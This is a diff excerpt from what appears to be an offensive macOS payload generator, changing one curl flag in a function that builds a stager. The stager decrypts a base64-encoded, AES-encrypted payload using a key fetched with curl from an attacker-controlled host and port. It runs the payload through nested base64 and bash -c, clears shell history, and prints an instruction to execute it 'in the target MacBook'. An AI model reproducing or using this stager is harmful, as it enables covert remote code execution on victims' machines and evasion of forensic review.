@@ -198,7 +198,7 @@ function mk_ssl () {
 function mk_stager () {
 	stager=""$junk">/dev/null 2>&1; openssl enc -d -aes-256-cbc \
 	-in <(printf '%s' '$(cat "$inFile".enc)' | base64 -D) \
-	-pass file:<(curl -s --insecure https://"$aH":"$aP")"
+	-pass file:<(curl -s --http0.9 --insecure https://"$aH":"$aP")"
 	echo -e "bash -c \"\$(bash -c \"\$(printf '%s' '$(printf '%s' "$stager" | base64)' | base64 -D)\")\";history -c" > "$dir"/"$inFile"_stager.txt &&\
 	msg "Saved stager: "$dir"/"$inFile"_stager.txt"
 	msg_instruct "Execute the below stager in the target MacBook:"
